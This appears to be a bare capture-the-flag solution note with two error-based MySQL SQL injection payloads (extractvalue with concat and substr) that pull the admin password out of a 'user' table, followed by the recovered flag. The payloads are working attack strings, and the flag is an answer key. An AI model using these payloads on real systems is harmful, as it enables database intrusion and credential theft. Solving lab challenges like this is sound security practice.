' or (SELECT extractvalue(1,concat(0x3a,(SELECT upw FROM user WHERE uid='admin'))));--
DH{c3968c78840750168774ad951fc98bf788563c4d}

' or (SELECT extractvalue(1,concat(0x3a,substr((SELECT upw FROM user WHERE uid='admin'), 25, 28))));--